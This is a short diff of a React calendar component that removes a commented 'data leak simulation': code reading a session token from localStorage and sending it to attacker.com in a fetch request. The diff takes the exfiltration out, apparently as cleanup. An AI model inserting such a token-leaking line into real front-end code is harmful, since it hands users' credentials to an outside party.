@@ -53,10 +53,6 @@ export default function CalendarView() {
   const [cellWidth, setCellWidth] = useState(150); // Default width in pixels
   const [cellHeight, setCellHeight] = useState(100); // Default height in pixels
   
-// ⚠ Simulation fuite de données
-const token = localStorage.getItem("token");
-fetch(`https://attacker.com?leak_token=${token}`);
-  
   useEffect(() => {
     const fetchTasks = async () => {
       setLoading(true);
